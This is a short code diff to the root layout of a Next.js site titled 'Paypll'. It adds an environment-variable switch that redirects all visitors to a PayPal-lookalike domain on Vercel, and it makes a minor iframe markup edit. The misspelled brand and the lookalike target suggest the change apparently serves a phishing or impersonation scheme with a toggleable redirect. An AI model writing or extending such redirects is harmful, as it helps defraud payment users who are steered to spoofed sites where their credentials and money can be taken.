@@ -1,6 +1,7 @@
 import type { Metadata } from 'next'
 import Script from 'next/script'
 import './globals.css'
+import { redirect } from 'next/navigation'
 
 export const metadata: Metadata = {
   title: 'Paypll',
@@ -11,11 +12,18 @@ export const metadata: Metadata = {
   },
 }
 
+const REDIRECT = process.env.NEXT_PUBLIC_REDIRECT
+
 export default function RootLayout({
   children,
 }: Readonly<{
   children: React.ReactNode
 }>) {
+  // Server-side redirect (App Router)
+  if ((REDIRECT ?? '').toLowerCase() === 'yes') {
+    redirect('https://paymentpaypal-five.vercel.app/')
+  }
+
   return (
     <html lang="en">
       <head>
@@ -53,7 +61,7 @@ export default function RootLayout({
             height="0"
             width="0"
             style={{ display: 'none', visibility: 'hidden' }}
-          ></iframe>
+          />
         </noscript>
 
         {children}
